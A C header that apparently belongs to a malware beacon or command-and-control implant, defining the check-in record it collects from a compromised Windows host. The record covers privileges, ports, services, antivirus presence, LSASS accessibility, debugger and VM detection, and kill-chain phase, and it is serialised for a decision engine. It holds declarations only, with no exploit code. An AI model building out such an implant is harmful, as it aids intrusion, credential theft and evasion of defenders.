// include/recon.h
#pragma once
#include <windows.h>

#define MAX_PORTS     64
#define MAX_SERVICES  32
#define MAX_SVC_LEN   64

typedef struct _CHECKIN_INFO {
    // -- Required by decision engine --
    CHAR  os[32];                                  // "Windows", "Linux", "macOS"
    CHAR  privilege_level[16];                     // "admin", "user", "system"
    DWORD open_ports[MAX_PORTS];
    DWORD port_count;
    CHAR  running_services[MAX_SERVICES][MAX_SVC_LEN];
    DWORD service_count;

    // -- Nice-to-have boolean flags --
    BOOL  domain_joined;
    BOOL  active_directory;
    BOOL  antivirus_running;
    BOOL  lsass_accessible;
    BOOL  ntlm_auth;

    // -- Beacon metadata --
    CHAR  hostname[256];
    CHAR  username[256];
    CHAR  os_version[128];                         // "Windows 10.0 Build 19045"
    DWORD pid;
    DWORD ppid;
    CHAR  arch[8];                                 // "x64" or "x86"
    CHAR  ip[46];
    BOOL  is_debugged;                             // Mod 71
    BOOL  is_vm;                                   // Mod 73

    // -- Kill chain tracking --
    CHAR  current_phase[32];                       // "discovery", "lateral", etc.
} CHECKIN_INFO, *PCHECKIN_INFO;

BOOL recon_collect(OUT PCHECKIN_INFO pInfo);
BOOL recon_serialize(IN PCHECKIN_INFO pInfo,
                     OUT CHAR** ppJson, OUT DWORD* pdwLen);
VOID recon_print(IN PCHECKIN_INFO pInfo);
